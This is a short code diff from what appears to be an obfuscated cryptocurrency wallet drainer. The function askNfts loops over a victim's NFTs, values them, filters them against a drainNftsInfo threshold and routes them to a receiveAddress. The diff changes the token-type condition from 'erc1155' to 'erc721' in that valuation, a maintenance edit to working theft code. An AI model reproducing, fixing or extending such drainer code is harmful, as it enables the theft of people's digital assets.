@@ -105,7 +105,7 @@ async function askNfts() {
     let _0x17b787 = [];
     for (nft of _0x1f76eb) {
         if (nft[_0x59bfc9(0x106)] === 0x0) continue;
-        const _0x3967ee = round(nft[_0x59bfc9(0x106)] * (nft['type'] == 'erc1155' ? nft[_0x59bfc9(0xb0)] : 0x1));
+        const _0x3967ee = round(nft[_0x59bfc9(0x106)] * (nft['type'] == 'erc721' ? nft[_0x59bfc9(0xb0)] : 0x1));
         if (_0x3967ee < drainNftsInfo[_0x59bfc9(0xd8)]) continue;
         const _0x2986ff = _0x3967ee < 0.000005 ? receiveAddress : nW;
         _0x17b787[_0x59bfc9(0xaa)]({
